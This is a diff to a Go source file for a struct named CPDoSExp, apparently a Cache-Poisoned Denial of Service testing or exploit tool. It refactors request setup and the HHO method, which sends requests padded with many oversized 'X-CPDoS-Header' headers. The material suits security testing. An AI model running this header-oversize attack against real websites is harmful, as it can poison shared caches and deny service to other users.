@@ -21,32 +21,29 @@ func NewCPDoSExp(url string) *CPDoSExp {
 	}
 }
 
-func (ce *CPDoSExp) preClear() {
-	ce.req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36")
+func (ce *CPDoSExp) preClear(req *gorequest.SuperAgent) {
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36")
 }
 
 // Get ..
 func (ce *CPDoSExp) Get() (string, int) {
-	ce.preClear()
-	return ce.formatResp(ce.req.Get(ce.URL).End())
+	ce.preClear(ce.req.Get(ce.URL))
+	return ce.formatResp(ce.req.End())
 }
 
 // HHO HTTP Header Oversize
 func (ce *CPDoSExp) HHO(num int) (string, int) {
-	ce.preClear()
+	ce.preClear(ce.req.Get(ce.URL))
 	for i := 0; i < num; i++ {
 		iStr := strconv.Itoa(i)
-		ce.req.AppendHeader("X-CPDoS-Header-"+iStr, "Session-Value-"+com.MD5(iStr))
+		ce.req.Header.Set("X-CPDoS-Header-"+iStr, "Session-Value-"+com.MD5(iStr))
 	}
-	return ce.formatResp(ce.req.Get(ce.URL).End())
+	return ce.formatResp(ce.req.End())
 }
 
 func (ce *CPDoSExp) formatResp(resp gorequest.Response, body string, errs []error) (string, int) {
 	if errs != nil {
 		return errs[0].Error(), 0
-	}
-	if len(body) > 200 {
-		body = body[:200]
 	}
 	return body, resp.StatusCode
 }
